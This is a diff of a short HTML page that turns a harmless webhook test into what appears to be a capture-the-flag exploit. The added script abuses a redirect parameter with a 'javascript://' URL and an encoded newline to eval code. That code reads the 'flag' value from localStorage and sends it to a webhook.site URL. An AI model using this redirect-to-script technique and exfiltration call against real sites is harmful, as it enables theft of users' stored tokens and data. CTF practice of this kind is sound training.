@@ -1,16 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Webhook Test</title>
-</head>
 <body>
-  <h1>Testing Webhook Connection...</h1>
-  <p>Check your webhook site. You should see a message from me!</p>
-
   <script>
-    // 直接向你的 webhook URL 發送一個 fetch 請求
-    // 我們附加一個查詢字串 ?status=test_successful 來明確表示這是來自測試頁面的訪問
-    fetch('https://webhook.site/eb84ac19-a281-4430-a79c-d9637e3b02dc/?status=test_successful_from_wow_html');
+    window.n = "fetch('https://webhook.site/eb84ac19-a281-4430-a79c-d9637e3b02dc/?flag=' + localStorage.getItem('flag'))";
+    window.location = "https://safe-url.ctfi.ng/?redirect=javascript://cor.team/%0aeval(n)";
   </script>
 </body>
 </html>
